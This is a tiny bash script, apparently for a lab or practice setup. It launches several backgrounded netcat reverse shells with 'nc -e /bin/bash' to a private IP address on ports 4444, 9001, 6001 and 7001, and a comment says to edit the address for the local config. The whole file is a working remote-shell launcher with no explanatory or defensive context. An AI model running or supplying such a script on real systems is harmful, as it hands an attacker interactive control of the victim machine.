#!/bin/bash
#edit ip and ports for your local config
nohup  nc -e /bin/bash 192.168.122.209 4444 & 
 nc -e /bin/bash 192.168.122.209 9001 & 
nc -e /bin/bash 192.168.122.209 6001 & 
nc -e /bin/bash 192.168.122.209 7001
